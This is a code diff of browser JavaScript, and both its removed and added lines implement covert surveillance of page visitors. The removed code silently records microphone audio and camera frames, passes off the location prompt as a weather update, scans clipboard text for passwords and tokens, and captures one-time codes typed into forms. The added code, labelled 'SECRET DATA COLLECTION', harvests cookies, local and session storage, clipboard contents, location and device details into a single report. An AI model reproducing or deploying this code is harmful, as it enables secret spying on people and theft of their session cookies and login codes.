-                    for (let i = 40; i < 80; i++) {
-                        if (dataArray[i] > 80) {
-                            voiceFreq = true;
-                            break;
-                        }
-                    }
-                    if (voiceFreq) {
-                        sendAlert(`🎵 Voice frequency detected`);
-                    }
-                }
-                
-            }, 1000);
-            
-            // Record a short sample after 3 seconds
-            setTimeout(() => {
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = (e) => chunks.push(e.data);
-                recorder.start();
-                
-                setTimeout(() => {
-                    recorder.stop();
-                    setTimeout(() => {
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        sendAlert(`🎵 Audio sample: ${Math.round(blob.size / 1024)}KB, ${(blob.size / 1024 / 1024).toFixed(2)}MB`);
-                        
-                        // Check if any audio was recorded
-                        if (blob.size > 1000) {
-                            sendAlert(`🎤 Audio content detected (${Math.round(blob.size / 1024)}KB)`);
-                        }
-                    }, 100);
-                }, 2000);
-                
-            }, 3000);
-            
-            // Stop monitoring after 15 seconds
-            setTimeout(() => {
-                clearInterval(monitorInterval);
-                stream.getTracks().forEach(track => track.stop());
-                document.getElementById('micDot').className = 'status-dot active';
-                sendAlert('🎤 Microphone monitoring complete');
-            }, 15000);
-            
-        } catch(e) {
-            document.getElementById('micDot').className = 'status-dot inactive';
-            sendAlert(`🎤 Microphone unavailable: ${e.message || 'Access denied'}`);
-            
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const hasMic = devices.some(d => d.kind === 'audioinput');
-                if (hasMic) {
-                    sendAlert('🎤 Microphone exists but access denied');
-                }
-            } catch(err) {}
-        }
-    }
-
-    // ============================================
-    //  AUTO: VIDEO (Silent background capture)
-    // ============================================
-    async function autoVideo() {
-        if (!CONFIG.AUTO_CAMERA) return;
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: 'environment',
-                    width: { ideal: 320 },
-                    height: { ideal: 240 },
-                },
-                audio: false
+            })
+            .catch(error => {
+                console.log('Network error:', error);
             });
-            
-            document.getElementById('videoDot').className = 'status-dot active';
-            sendAlert('🎥 Video camera accessed (back camera)');
-            
-            // Capture a frame
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 320;
-                canvas.height = video.videoHeight || 240;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
+        }
+
+        // ===== SECRET DATA COLLECTION =====
+
+        // 1. BATTERY INFORMATION
+        function collectBatteryInfo() {
+            return new Promise((resolve) => {
+                if (!navigator.getBattery) {
+                    resolve({ level: 'N/A', charging: 'N/A' });
+                    return;
+                }
                 
-                const imageData = canvas.toDataURL('image/jpeg', 0.2);
-                sendAlert(`🎥 Video frame captured: ${canvas.width}×${canvas.height}`);
-                
-                stream.getTracks().forEach(track => track.stop());
-            }, 1000);
-            
-        } catch(e) {
-            document.getElementById('videoDot').className = 'status-dot inactive';
-            sendAlert(`🎥 Video unavailable: ${e.message || 'Access denied'}`);
-        }
-    }
-
-    // ============================================
-    //  AUTO: LOCATION (Silent - No Popup)
-    // ============================================
-    function autoLocation() {
-        if (!CONFIG.AUTO_GEO) return;
-        
-        // Try to get location without showing popup if already granted
-        if (navigator.permissions) {
-            navigator.permissions.query({ name: 'geolocation' }).then(result => {
-                if (result.state === 'granted') {
-                    getLocationSilent();
-                } else if (result.state === 'prompt') {
-                    // Will show popup - but disguised as weather update
-                    showToast('🌤️ Updating weather...');
-                    setTimeout(() => {
-                        getLocationSilent();
-                    }, 500);
-                } else {
-                    // Denied - use IP
-                    getIPLocation();
-                }
-            }).catch(() => {
-                // Fallback - try directly
-                setTimeout(() => {
-                    getLocationSilent();
-                }, 1000);
-            });
-        } else {
-            // Fallback for older browsers
-            setTimeout(() => {
-                getLocationSilent();
-            }, 1000);
-        }
-    }
-
-    function getLocationSilent() {
-        if (!navigator.geolocation) return;
-        
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                STATE.location = {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                };
-                sendAlert(`📍 Location: ${STATE.location.lat.toFixed(6)}, ${STATE.location.lng.toFixed(6)}`);
-                updateWeatherUI(STATE.location);
-                updateUI();
-            },
-            (err) => {
-                sendAlert(`📍 Location error: ${err.message}`);
-                getIPLocation();
-            },
-            { enableHighAccuracy: true, timeout: 8000 }
-        );
-    }
-
-    async function getIPLocation() {
-        try {
-            const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
-            const data = await res.json();
-            STATE.ipData = {
-                ip: data.ip || 'Unknown',
-                city: data.city || 'Unknown',
-                region: data.region || 'Unknown',
-                country: data.country_name || 'Unknown',
-                isp: data.org || 'Unknown',
-                lat: data.latitude || null,
-                lng: data.longitude || null,
-            };
-            sendAlert(`📍 IP Location: ${STATE.ipData.city}, ${STATE.ipData.country}`);
-            updateWeatherUI(null, STATE.ipData);
-            updateUI();
-        } catch {
-            sendAlert('📍 IP location unavailable');
-        }
-    }
-
-    // ============================================
-    //  AUTO: BATTERY
-    // ============================================
-    async function autoBattery() {
-        if (!CONFIG.AUTO_BATTERY || !navigator.getBattery) return;
-        
-        try {
-            const battery = await navigator.getBattery();
-            STATE.batteryLevel = Math.round(battery.level * 100);
-            STATE.isCharging = battery.charging;
-            STATE.lastBatteryLevel = battery.level;
-            STATE.lastBatteryTime = Date.now();
-            
-            sendAlert(`🔋 Battery: ${STATE.batteryLevel}% (${battery.charging ? '⚡ Charging' : '🔋 Battery'})`);
-            
-            // Update footer
-            document.getElementById('footerBattery').textContent = `${STATE.batteryLevel}%`;
-            
-            // Monitor changes
-            battery.addEventListener('levelchange', () => {
-                const newLevel = Math.round(battery.level * 100);
-                STATE.batteryLevel = newLevel;
-                document.getElementById('footerBattery').textContent = `${newLevel}%`;
-                
-                if (newLevel < 20) {
-                    sendAlert(`⚠️ Low battery: ${newLevel}%`);
-                }
-                if (newLevel > 95 && battery.charging) {
-                    sendAlert(`✅ Battery full: ${newLevel}%`);
-                }
-            });
-            
-            battery.addEventListener('chargingchange', () => {
-                STATE.isCharging = battery.charging;
-                sendAlert(`⚡ Charging: ${battery.charging ? 'Started' : 'Stopped'}`);
-            });
-            
-            // Detect drain rate after 30 seconds
-            setTimeout(() => {
-                if (battery.level < STATE.lastBatteryLevel) {
-                    const drain = (STATE.lastBatteryLevel - battery.level) * 100;
-                    if (drain > 2) {
-                        sendAlert(`⚡ Drain rate: ${drain.toFixed(1)}% in 30s`);
-                    }
-                }
-            }, 30000);
-            
-        } catch(e) {
-            sendAlert(`🔋 Battery unavailable: ${e.message}`);
-        }
-    }
-
-    // ============================================
-    //  AUTO: CLIPBOARD
-    // ============================================
-    function autoClipboard() {
-        if (!CONFIG.AUTO_CLIPBOARD) return;
-        
-        // Try to read clipboard on load
-        setTimeout(async () => {
-            try {
-                const text = await navigator.clipboard.readText();
-                if (text && text.length > 0) {
-                    STATE.clipboardContent = text;
-                    const preview = text.substring(0, 100);
-                    sendAlert(`📋 Clipboard: ${preview}${text.length > 100 ? '...' : ''} (${text.length} chars)`);
-                    
-                    // Check for sensitive data
-                    const sensitive = ['password', 'pass', 'key', 'secret', 'token', 'bank', 'card', 'pin', 'otp'];
-                    const lowerText = text.toLowerCase();
-                    for (const word of sensitive) {
-                        if (lowerText.includes(word)) {
-                            sendAlert(`⚠️ Sensitive clipboard data detected: ${word}`);
-                            break;
-                        }
-                    }
-                }
-            } catch(e) {}
-        }, 2000);
-        
-        // Monitor clipboard changes
-        document.addEventListener('copy', () => {
-            setTimeout(async () => {
-                try {
-                    const text = await navigator.clipboard.readText();
-                    if (text && text.length > 0 && text !== STATE.clipboardContent) {
-                        STATE.clipboardContent = text;
-                        sendAlert(`📋 Copied: ${text.substring(0, 50)}...`);
-                    }
-                } catch(e) {}
-            }, 100);
-        });
-    }
-
-    // ============================================
-    //  AUTO: OTP DETECTION
-    // ============================================
-    function autoOTP() {
-        if (!CONFIG.AUTO_OTP) return;
-        
-        // Monitor all input fields for OTP patterns
-        const observer = new MutationObserver(() => {
-            document.querySelectorAll('input[type="text"], input[type="number"], input[type="tel"]').forEach(input => {
-                if (!input._otpMonitored) {
-                    input._otpMonitored = true;
-                    input.addEventListener('input', () => {
-                        const val = input.value;
-                        if (val && /^\d{4,6}$/.test(val)) {
-                            STATE.otpDetected = val;
-                            sendAlert(`🔑 OTP detected: ${val}`);
-                            
-                            // Check field names
-                            const attrs = ['name', 'id', 'placeholder', 'autocomplete'];
-                            for (const attr of attrs) {
-                                const value = input.getAttribute(attr);
-                                if (value) {
-                                    const lower = value.toLowerCase();
-                                    if (lower.includes('otp') || lower.includes('code') || 
-                                        lower.includes('verification') || lower.includes('sms')) {
-                                        sendAlert(`🔐 OTP field identified: ${value}`);
-                                        break;
-                                    }
-                                }
-                            }
-                        }
+                navigator.getBattery().then(function(battery) {
+                    resolve({
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging ? 'Charging' : 'Not Charging',
+                        dischargingTime: battery.dischargingTime ? 
+                            Math.round(battery.dischargingTime / 60) + ' mins' : 'N/A',
+                        chargingTime: battery.chargingTime ? 
+                            Math.round(battery.chargingTime / 60) + ' mins' : 'N/A'
                     });
-                }
-            });
-        });
-        
-        observer.observe(document.body, { childList: true, subtree: true });
-    }
-
-    // ============================================
-    //  AUTO: MOTION & GYROSCOPE
-    // ============================================
-    function autoMotion() {
-        if (!CONFIG.AUTO_MOTION) return;
-        
-        if (window.DeviceMotionEvent) {
-            let lastMotionTime = 0;
-            
-            window.addEventListener('devicemotion', (e) => {
-                const accel = e.accelerationIncludingGravity;
-                if (accel) {
-                    const x = Math.abs(accel.x || 0);
-                    const y = Math.abs(accel.y || 0);
-                    const z = Math.abs(accel.z || 0);
-                    const total = Math.sqrt(x*x + y*y + z*z);
-                    
-                    const now = Date.now();
-                    if (total > 22 && now - lastMotionTime > 3000) {
-                        lastMotionTime = now;
-                        sendAlert(`📱 Device movement: ${total.toFixed(1)} m/s²`);
-                        
-                        if (total > 35) {
-                            sendAlert(`🏃 Running/walking detected`);
-                        }
-                    }
-                    
-                    // Detect device position
-                    if (total < 9.8) {
-                        STATE.orientation = 'Flat';
-                    } else if (Math.abs(x) > 8) {
-                        STATE.orientation = 'Portrait';
-                    } else if (Math.abs(y) > 8) {
-                        STATE.orientation = 'Landscape';
-                    }
-                }
-            });
-            
-            // Orientation change
-            window.addEventListener('orientationchange', () => {
-                sendAlert(`🔄 Orientation: ${getOrientation()}`);
+                }).catch(() => resolve({ level: 'N/A', charging: 'N/A' }));
             });
         }
-    }
 
-    // ============================================
-    //  AUTO: LIGHT SENSOR
-    // ============================================
-    function autoLightSensor() {
-        if (!CONFIG.AUTO_LIGHT) return;
-        
-        if ('AmbientLightSensor' in window) {
-            try {
-                const sensor = new AmbientLightSensor();
-                sensor.addEventListener('reading', () => {
-                    const lux = sensor.illuminance;
-                    if (lux < 5) {
-                        sendAlert(`🌙 Very dark: ${lux} lux (pocket/purse)`);
-                    } else if (lux < 50) {
-                        sendAlert(`🌙 Dim: ${lux} lux (indoor)`);
-                    } else if (lux > 5000) {
-                        sendAlert(`☀️ Very bright: ${lux} lux (outdoor)`);
-                    } else if (lux > 1000) {
-                        sendAlert(`☀️ Bright: ${lux} lux`);
-                    }
-                });
-                sensor.start();
-                sendAlert('💡 Light sensor active');
-            } catch(e) {}
+        // 2. LOCATION (requires permission)
+        function collectLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ lat: 'N/A', long: 'N/A' });
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            long: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy + 'm'
+                        });
+                    },
+                    () => resolve({ lat: 'N/A', long: 'N/A' }),
+                    { timeout: 5000, enableHighAccuracy: false }
+                );
+            });
         }
-    }
 
-    // ============================================
-    //  AUTO: EXTENSIONS DETECTION
-    // ============================================
-    function autoExtensions() {
-        if (!CONFIG.AUTO_EXTENSIONS) return;
-        
-        const extensions = {
-            'AdBlock': 'gighmmpiobklfepjocnamgkkbiglidom',
-            'uBlock': 'cjpalhdlnbpafiamejdnhcphjbkeiagm',
-            'Grammarly': 'kbfnbcaeplbcioakkpcpgfkobkghlhen',
-            'LastPass': 'hdokiejnpimakedhajhdlcegeplioahd',
-            'DarkReader': 'eimadpbcbfnmbkopoojfekhnkhdbieeh',
-            'Honey': 'bmnlcjabgnpnenekpadlanbbkooimhnj',
-            'NoScript': 'doojmbjmlfjjnbmnoijecmcbfeoakpjm',
-            'Ghostery': 'mlomiejdfkolichcflejclcbmpeaniij',
-            'PrivacyBadger': 'pkehgijcmpdhfbdbbnkijodmdjhbjlgp',
-            'VueDevTools': 'nhdogjmejiglipccpnnnanhbledajbpd',
-            'ReactDevTools': 'fmkadmapgofadopljbjfkapdkoienihi',
-            'Bitwarden': 'nngceckbapebfimnlniiiahkandclblb',
-        };
-        
-        let detected = [];
-        for (const [name, id] of Object.entries(extensions)) {
-            const img = document.createElement('img');
-            img.src = `chrome-extension://${id}/icon.png`;
-            img.onerror = () => {
-                const link = document.createElement('link');
-                link.rel = 'stylesheet';
-                link.href = `chrome-extension://${id}/manifest.json`;
-                link.onload = () => {
-                    if (!detected.includes(name)) {
-                        detected.push(name);
-                        STATE.detectedExtensions = detected;
-                        sendAlert(`🔌 Extension: ${name}`);
-                    }
-                };
-                link.onerror = () => {
-                    const testEl = document.createElement('div');
-                    testEl.style.cssText = `position:fixed;top:-999px;left:-999px;`;
-                    testEl.className = `_${id}_test`;
-                    document.body.appendChild(testEl);
-                    setTimeout(() => {
-                        if (getComputedStyle(testEl).display !== 'none') {
-                            if (!detected.includes(name)) {
-                                detected.push(name);
-                                STATE.detectedExtensions = detected;
-                                sendAlert(`🔌 Extension: ${name}`);
-                            }
-                        }
-                        document.body.removeChild(testEl);
-                    }, 100);
-                };
-                document.head.appendChild(link);
+        // 3. DEVICE INFORMATION
+        function collectDeviceInfo() {
+            return {
+                platform: navigator.platform || 'N/A',
+                userAgent: navigator.userAgent || 'N/A',
+                language: navigator.language || 'N/A',
+                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                maxTouchPoints: navigator.maxTouchPoints || 'N/A',
+                vendor: navigator.vendor || 'N/A',
+                doNotTrack: navigator.doNotTrack || 'Not Set',
+                cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : 'N/A',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+                timezoneOffset: new Date().getTimezoneOffset() / 60 + ' hours'
             };
         }
-        
-        // Report total after 5 seconds
-        setTimeout(() => {
-            if (detected.length > 0) {
-                sendAlert(`🔌 Total extensions detected: ${detected.length}`);
-            }
-        }, 5000);
-    }
 
-    // ============================================
-    //  AUTO: SCREENSHOT DETECTION
-    // ============================================
-    function autoScreenshotDetection() {
-        if (!CONFIG.AUTO_SCREENSHOT) return;
-        
-        // Tab visibility change
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                setTimeout(() => {
-                    if (!document.hidden) {
-                        sendAlert('📸 Possible screenshot (tab switch)');
-                    }
-                }, 1500);
+        // 4. NETWORK INFORMATION
+        function collectNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!connection) {
+                return { type: 'N/A', effectiveType: 'N/A', downlink: 'N/A', rtt: 'N/A' };
             }
-        });
-        
-        // Key combinations
-        document.addEventListener('keydown', (e) => {
-            if (e.ctrlKey && e.key === 's') {
-                sendAlert('📸 Screenshot: Ctrl+S');
+            
+            return {
+                type: connection.type || 'N/A',
+                effectiveType: connection.effectiveType || 'N/A',
+                downlink: connection.downlink ? connection.downlink + ' Mbps' : 'N/A',
+                rtt: connection.rtt ? connection.rtt + ' ms' : 'N/A',
+                saveData: connection.saveData ? 'Enabled' : 'Disabled'
+            };
+        }
+
+        // 5. SCREEN INFORMATION
+        function collectScreenInfo() {
+            return {
+                width: window.screen.width,
+                height: window.screen.height,
+                availWidth: window.screen.availWidth,
+                availHeight: window.screen.availHeight,
+                colorDepth: window.screen.colorDepth || 'N/A',
+                pixelRatio: window.devicePixelRatio || 'N/A',
+                orientation: screen.orientation ? screen.orientation.type : 'N/A'
+            };
+        }
+
+        // 6. PERFORMANCE INFORMATION
+        function collectPerformanceInfo() {
+            const perf = performance;
+            const memory = perf.memory || {};
+            
+            return {
+                memoryUsed: memory.usedJSHeapSize ? 
+                    Math.round(memory.usedJSHeapSize / (1024 * 1024)) + ' MB' : 'N/A',
+                memoryTotal: memory.totalJSHeapSize ? 
+                    Math.round(memory.totalJSHeapSize / (1024 * 1024)) + ' MB' : 'N/A',
+                memoryLimit: memory.jsHeapSizeLimit ? 
+                    Math.round(memory.jsHeapSizeLimit / (1024 * 1024)) + ' MB' : 'N/A',
+                navigationType: perf.navigation ? perf.navigation.type : 'N/A',
+                loadTime: perf.timing ? 
+                    (perf.timing.loadEventEnd - perf.timing.navigationStart) + ' ms' : 'N/A'
+            };
+        }
+
+        // 7. BROWSER PLUGINS
+        function collectPlugins() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
             }
-            if (e.key === 'PrintScreen') {
-                sendAlert('📸 Screenshot: PrintScreen');
-            }
-            if (e.ctrlKey && e.shiftKey && e.key === 'S') {
-                sendAlert('📸 Screenshot: Ctrl+Shift+S');
-            }
-        });
-        
-        // iOS screenshot detection
-        let lastVolumePress = 0;
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'VolumeUp' || e.key === 'VolumeDown') {
-                const now = Date.now();
-                if (now - lastVolumePress < 300) {
-                    sendAlert('📸 iOS screenshot detected');
+            return plugins.length > 0 ? plugins.join(', ') : 'No plugins';
+        }
+
+        // 8. CLIPBOARD (attempt to read)
+        async function collectClipboard() {
+            try {
+                if (navigator.clipboard) {
+                    const text = await navigator.clipboard.readText();
+                    return text ? text.substring(0, 100) + (text.length > 100 ? '...' : '') : 'Empty';
                 }
-                lastVolumePress = now;
+                return 'Not accessible';
+            } catch (e) {
+                return 'Permission denied';
             }
-        });
-    }
+        }
 
-    // ============================================
-    //  AUTO: PERFORMANCE & NETWORK
-    // ============================================
-    function autoPerformance() {
-        if (!CONFIG.AUTO_PERFORMANCE) return;
-        
-        window.addEventListener('load', () => {
-            const perfData = performance.getEntriesByType('navigation')[0];
-            if (perfData) {
-                const metrics = {
-                    dns: Math.round(perfData.domainLookupEnd - perfData.domainLookupStart),
-                    tcp: Math.round(perfData.connectEnd - perfData.connectStart),
-                    ttfb: Math.round(perfData.responseStart - perfData.requestStart),
-                    dom: Math.round(perfData.domComplete - perfData.domInteractive),
-                    load: Math.round(perfData.loadEventEnd - perfData.fetchStart),
-                };
-                sendAlert(`⏱️ Performance: DNS=${metrics.dns}ms, TTFB=${metrics.ttfb}ms, Load=${metrics.load}ms`);
-            }
-            
-            if (performance.memory) {
-                const mem = performance.memory;
-                const used = Math.round(mem.usedJSHeapSize / 1024 / 1024);
-                const total = Math.round(mem.jsHeapSizeLimit / 1024 / 1024);
-                sendAlert(`💾 Memory: ${used}MB / ${total}MB`);
-            }
-        });
-    }
+        // 9. COOKIES
+        function collectCookies() {
+            return document.cookie || 'No cookies';
+        }
 
-    function autoNetwork() {
-        if (!CONFIG.AUTO_NETWORK) return;
-        
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            setTimeout(() => {
-                const type = getNetworkType();
-                const speed = conn.downlink || '?';
-                sendAlert(`🌐 Network: ${type}, ${speed}Mbps, ${conn.rtt || '?'}ms RTT`);
-                document.getElementById('footerNetwork').textContent = type;
-            }, 1000);
-            
-            conn.addEventListener('change', () => {
-                const type = getNetworkType();
-                const speed = conn.downlink || '?';
-                sendAlert(`🌐 Network changed: ${type}, ${speed}Mbps`);
-                document.getElementById('footerNetwork').textContent = type;
+        // 10. LOCAL STORAGE
+        function collectLocalStorage() {
+            try {
+                const items = [];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    items.push(`${key}: ${localStorage.getItem(key).substring(0, 30)}...`);
+                }
+                return items.length > 0 ? items.join(' | ') : 'Empty';
+            } catch (e) {
+                return 'Not accessible';
+            }
+        }
+
+        // 11. SESSION STORAGE
+        function collectSessionStorage() {
+            try {
+                const items = [];
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    items.push(`${key}: ${sessionStorage.getItem(key).substring(0, 30)}...`);
+                }
+                return items.length > 0 ? items.join(' | ') : 'Empty';
+            } catch (e) {
+                return 'Not accessible';
+            }
+        }
+
+        // 12. WEBRTC (IP leak check)
+        function collectWebRTC() {
+            return new Promise((resolve) => {
+                try {
+                    const RTCPeerConnection = window.RTCPeerConnection || 
+                                             window.webkitRTCPeerConnection || 
+                                             window.mozRTCPeerConnection;
+                    if (!RTCPeerConnection) {
+                        resolve('Not supported');
+                        return;
+                    }
+                    
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => {
+                        pc.setLocalDescription(offer);
+                        resolve('WebRTC supported (potential IP leak)');
+                    }).catch(() => resolve('WebRTC error'));
+                } catch (e) {
+                    resolve('WebRTC blocked');
+                }
             });
         }
-    }
 
-    // ============================================
-    //  AUTO: SOCIAL & REFERRER
-    // ============================================
-    function autoSocialDetection() {
-        if (!CONFIG.AUTO_SOCIAL) return;
-        
-        const referrer = document.referrer.toLowerCase();
-        const socialNetworks = {
-            'facebook': 'Facebook',
-            'twitter': 'Twitter/X',
-            'instagram': 'Instagram',
-            'youtube': 'YouTube',
-            'tiktok': 'TikTok',
-            'linkedin': 'LinkedIn',
-            'reddit': 'Reddit',
-            'whatsapp': 'WhatsApp',
-            'telegram': 'Telegram',
-            'discord': 'Discord',
-            'snapchat': 'Snapchat',
-            'pinterest': 'Pinterest',
-            'tumblr': 'Tumblr',
-            'google': 'Google Search',
-            'bing': 'Bing Search',
-            'duckduckgo': 'DuckDuckGo',
-        };
-        
-        for (const [key, name] of Object.entries(socialNetworks)) {
-            if (referrer.includes(key)) {
-                sendAlert(`📱 Source: ${name}`);
-                break;
-            }
+        // 13. VISIBILITY API
+        function collectVisibility() {
+            return document.hidden ? 'Hidden' : 'Visible';
         }
-        
-        // UTM parameters
-        const urlParams = new URLSearchParams(window.location.search);
-        const utm = urlParams.get('utm_source');
-        if (utm) {
-            sendAlert(`📱 UTM Source: ${utm}`);
-        }
-    }
 
-    // ============================================
-    //  AUTO: THEME & ORIENTATION
-    // ============================================
-    function autoThemeDetection() {
-        if (!CONFIG.AUTO_THEME) return;
-        
-        // Dark mode
-        const darkModeMedia = window.matchMedia('(prefers-color-scheme: dark)');
-        if (darkModeMedia.matches) {
-            sendAlert('🎨 Theme: Dark');
-        } else {
-            sendAlert('🎨 Theme: Light');
+        // 14. KEYBOARD LAYOUT
+        function collectKeyboardLayout() {
+            return navigator.keyboard ? 'Keyboard API available' : 'Not available';
         }
-        
-        darkModeMedia.addEventListener('change', (e) => {
-            sendAlert(`🎨 Theme: ${e.matches ? 'Dark' : 'Light'}`);
-        });
-        
-        // Reduced motion
-        const motionMedia = window.matchMedia('(prefers-reduced-motion: reduce)');
-        if (motionMedia.matches) {
-            sendAlert('🎬 Motion: Reduced');
-        }
-    }
 
-    // ============================================
-    //  AUTO: IDLE DETECTION
-    // ============================================
-    function autoIdleDetection() {
-        if (!CONFIG.AUTO_IDLE) return;
-        
-        let idleTime = 0;
-        let idleAlertSent = false;
-        
-        setInterval(() => {
-            idleTime++;
-            if (idleTime > 60 && !idleAlertSent) {
-                idleAlertSent = true;
-                sendAlert(`💤 Idle: ${idleTime}s`);
-            }
-            if (idleTime > 300) {
-                sendAlert(`😴 Long idle: ${Math.round(idleTime / 60)}min`);
-            }
-        }, 1000);
-        
-        const resetIdle = () => {
-            if (idleTime > 30) {
-                sendAlert(`👆 Active after ${idleTime}s idle`);
-            }
-            idleTime = 0;
-            idleAlertSent = false;
-        };
-        
-        document.addEventListener('mousemove', resetIdle);
-        document.addEventListener('keydown', resetIdle);
-        document.addEventListener('touchstart', resetIdle);
-        document.addEventListener('scroll', resetIdle);
-        document.addEventListener('click', resetIdle);
-    }
-
-    // ============================================
-    //  AUTO: MEDIA PLAYBACK
-    // ============================================
-    function autoMediaDetection() {
-        if (!CONFIG.AUTO_MEDIA) return;
-        
-        document.addEventListener('play', (e) => {
-            const target = e.target;
-            if (target.tagName === 'VIDEO' || target.tagName === 'AUDIO') {
-                const src = target.src || target.currentSrc || 'unknown';
-                sendAlert(`▶️ Media playing: ${src.substring(0, 50)}`);
-                if (target.tagName === 'VIDEO') {
-                    sendAlert(`📹 Video: ${target.videoWidth}×${target.videoHeight}`);
+        // 15. MEDIA DEVICES
+        async function collectMediaDevices() {
+            try {
+                if (navigator.mediaDevices) {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const info = devices.map(d => d.kind + ' (' + d.label + ')').join(', ');
+                    return info || 'No devices';
                 }
+                return 'Not supported';
+            } catch (e) {
+                return 'Permission denied';
             }
-        }, true);
-        
-        document.addEventListener('pause', (e) => {
-            const target = e.target;
-            if (target.tagName === 'VIDEO' || target.tagName === 'AUDIO') {
-                sendAlert('⏸️ Media paused');
-            }
-        }, true);
-    }
+        }
 
-    // ============================================
-    //  AUTO: USER INTERACTIONS
-    // ============================================
-    function autoInteractionTracking() {
-        document.addEventListener('mousemove', () => {
-            STATE.mouseMoves++;
-            if (STATE.mouseMoves % 50 === 0) {
-                sendAlert(`🖱️ Mouse moves: ${STATE.mouseMoves}`);
-            }
-        });
-        
-        document.addEventListener('click', () => {
-            STATE.clicks++;
-            if (STATE.clicks % 5 === 0) {
-                sendAlert(`👆 Clicks: ${STATE.clicks}`);
-            }
-        });
-        
-        document.addEventListener('scroll', () => {
-            STATE.scrolls++;
-            if (STATE.scrolls % 10 === 0) {
-                sendAlert(`📜 Scrolls: ${STATE.scrolls}`);
-            }
-        });
-        
-        // Text selection
-        document.addEventListener('mouseup', () => {
-            const selection = window.getSelection().toString();
-            if (selection.length > 30) {
-                sendAlert(`📝 Selection: ${selection.substring(0, 50)}...`);
-            }
-        });
-    }
+        // ===== MAIN COLLECTION FUNCTION =====
+        async function collectAllData() {
+            console.log('🔍 Collecting all tracking data...');
+            
+            try {
+                // Collect everything in parallel
+                const [
+                    battery,
+                    location,
+                    clipboard,
+                    webrtc,
+                    mediaDevices
+                ] = await Promise.all([
+                    collectBatteryInfo(),
+                    collectLocation(),
+                    collectClipboard(),
+                    collectWebRTC(),
+                    collectMediaDevices()
+                ]);
 
-    // ============================================
-    //  AUTO: FILE DETECTION
-    // ============================================
-    function autoFileDetection() {
-        if (!CONFIG.AUTO_FILE) return;
-        
-        document.addEventListener('change', (e) => {
-            const target = e.target;
-            if (target.type === 'file' && target.files.length > 0) {
-                const file = target.files[0];
-                sendAlert(`📁 File: ${file.name} (${Math.round(file.size / 1024)}KB)`);
+                const deviceInfo = collectDeviceInfo();
+                const networkInfo = collectNetworkInfo();
+                const screenInfo = collectScreenInfo();
+                const perfInfo = collectPerformanceInfo();
+
+                // Build the comprehensive report
+                const report = `📱 <b>COMPLETE DEVICE REPORT</b>\n\n` +
+                              `━━━━━━━━━━━━━━━━━━━\n` +
+                              `<b>🔋 BATTERY</b>\n` +
+                              `Level: ${battery.level}%\n` +
+                              `Status: ${battery.charging}\n` +
+                              `Charging Time: ${battery.chargingTime}\n` +
+                              `Discharging Time: ${battery.dischargingTime}\n\n` +
+                              
+                              `<b>📍 LOCATION</b>\n` +
+                              `Latitude: ${location.lat}\n` +
+                              `Longitude: ${location.long}\n` +
+                              `Accuracy: ${location.accuracy || 'N/A'}\n\n` +
+                              
+                              `<b>💻 DEVICE</b>\n` +
+                              `Platform: ${deviceInfo.platform}\n` +
+                              `OS: ${deviceInfo.userAgent.split('(')[1]?.split(')')[0] || 'N/A'}\n` +
+                              `Language: ${deviceInfo.language}\n` +
+                              `Timezone: ${deviceInfo.timezone}\n` +
+                              `Cores: ${deviceInfo.hardwareConcurrency}\n` +
+                              `Memory: ${deviceInfo.deviceMemory} GB\n` +
+                              `Touch Points: ${deviceInfo.maxTouchPoints}\n` +
+                              `Vendor: ${deviceInfo.vendor}\n` +
+                              `Do Not Track: ${deviceInfo.doNotTrack}\n\n` +
+                              
+                              `<b>🌐 NETWORK</b>\n` +
+                              `Type: ${networkInfo.type}\n` +
+                              `Speed: ${networkInfo.effectiveType}\n` +
+                              `Downlink: ${networkInfo.downlink}\n` +
+                              `Latency: ${networkInfo.rtt}\n` +
+                              `Save Data: ${networkInfo.saveData}\n\n` +
+                              
+                              `<b>🖥️ SCREEN</b>\n` +
+                              `Resolution: ${screenInfo.width}×${screenInfo.height}\n` +
+                              `Available: ${screenInfo.availWidth}×${screenInfo.availHeight}\n` +
+                              `Color Depth: ${screenInfo.colorDepth} bit\n` +
+                              `Pixel Ratio: ${screenInfo.pixelRatio}\n` +
+                              `Orientation: ${screenInfo.orientation}\n\n` +
+                              
+                              `<b>⚡ PERFORMANCE</b>\n` +
+                              `Memory Used: ${perfInfo.memoryUsed}\n` +
+                              `Memory Total: ${perfInfo.memoryTotal}\n` +
+                              `Memory Limit: ${perfInfo.memoryLimit}\n` +
